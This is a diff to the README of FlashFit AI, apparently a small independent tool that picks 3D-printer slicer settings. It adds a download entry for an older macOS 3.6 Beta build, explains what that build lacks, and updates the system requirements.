@@ -8,11 +8,11 @@ It is an independent project by a single Italian developer. It began with a
 simple frustration — advanced slicers are powerful, but finding the right
 combination of settings for each model and material is still needlessly hard.
 
-**Windows only.** The macOS build is discontinued and no longer supported.
+## Downloads
 
-## Download
+### Windows 11 x64 — 4.3.0 · current
 
-[**FlashFit AI 4.3.0 — Windows 11 x64**](https://github.com/alexmark53343-byte/FlashFit-AI/raw/main/downloads/FlashFit-AI-Windows-11-x64.zip) · 3.2 MB
+[**FlashFit-AI-Windows-11-x64.zip**](https://github.com/alexmark53343-byte/FlashFit-AI/raw/main/downloads/FlashFit-AI-Windows-11-x64.zip) · 3.2 MB
 
 Extract and run. Nothing to install. The AI model is not in the download — the
 application fetches it the first time you choose one, so the app itself stays
@@ -21,6 +21,19 @@ small.
 Compare the executable against `SHA256SUMS.txt` inside the archive. It is not
 Authenticode-signed yet, so Windows SmartScreen will report an unknown
 publisher.
+
+### macOS Apple Silicon — 3.6 Beta · older
+
+[**FlashFit-AI-Apple-Silicon.zip**](https://github.com/alexmark53343-byte/FlashFit-AI/raw/main/FlashFit-AI-Apple-Silicon.zip) · 1.3 MB · M1, M2, M3, M4 and newer
+
+This is the August 3rd build and it has not moved since. Development has been on
+Windows, so it does not have the work that followed — the slicer import fix, the
+local AI, the wider filament catalogue, or the corrected time estimates. The
+sources in this repository no longer build it either: on anything other than
+Windows they compile to the engine's self-check and nothing else.
+
+It is kept here because it still works for what 3.6 did. Use the Windows build
+if you have the choice.
 
 ---
 
@@ -125,7 +138,8 @@ by a forced quit.
 
 ## Requirements
 
-- Windows 11 x64
+- Windows 11 x64 for the current build, or an Apple Silicon Mac for the older
+  3.6 one
 - Flash Studio Desktop, Bambu Studio, or a compatible Orca build, with an
   official profile installed for your printer
 - No GPU required. The model runs on CPU and uses a GPU only if one is present.
